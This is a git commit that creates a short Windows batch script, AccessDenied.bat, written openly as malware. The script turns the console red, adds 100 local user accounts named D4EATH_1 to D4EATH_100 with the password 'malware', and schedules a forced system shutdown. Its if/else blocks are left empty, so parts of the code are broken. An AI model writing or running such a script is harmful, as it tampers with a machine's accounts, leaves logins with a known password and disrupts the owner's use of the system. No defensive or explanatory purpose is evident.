1ae738113dc18ce11537edff32b274f65dc4f4bc
Bobdahacker-official <benimany123@gmail.com>
2025-01-19 10:13:40 +0000

    Create AccessDenied.bat

---
+++ AccessDenied.bat
@@ -0,0 +1,21 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Change console background color to red (color code 4)
+color 4F
+
+:: Loop to create users
+for /L %%i in (1,1,100) do (
+    echo Creating user D4EATH_%%i...
+    net user D4EATH_%%i malware /add
+    if errorlevel 1 (
+        
+    ) else (
+        
+    )
+)
+
+:: Final message
+shutdown -s -t 100
+
+endlocal
